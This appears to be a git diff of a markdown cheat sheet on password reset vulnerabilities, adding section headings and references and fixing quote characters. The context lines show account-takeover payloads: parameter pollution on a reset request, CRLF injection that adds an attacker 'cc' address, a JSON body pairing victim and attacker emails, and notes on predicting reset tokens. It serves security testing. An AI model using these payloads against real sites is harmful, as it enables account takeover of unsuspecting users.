@@ -1,5 +1,9 @@
 ## Password Reset Flaws
 
+## Introduction
+Common security flaws in password reset functionality
+
+## How to exploit
 1. Parameter pollution in reset password
 ```
 POST /reset
@@ -77,7 +81,7 @@ email=victim@mail.com%0a%0dcc:hacker@mail.com
 ```
 POST /newaccount
 [...]
-{“email”:“victim@mail.com”,”hacker@mail.com”,“token”:”xxxxxxxxxx”}
+{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}
 ```
 
 9. Find out how the tokens generate
@@ -85,4 +89,7 @@ POST /newaccount
 - Generated based on the ID of the user
 - Generated based on the email of the user
 - Generated based on the name of the user
-> [For Example](https://medium.com/bugbountywriteup/how-i-discovered-an-interesting-account-takeover-flaw-18a7fb1e5359)
+
+## References
+* [anugrahsr](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
+* [Frooti](https://twitter.com/HackerGautam/status/1502264873287569414)
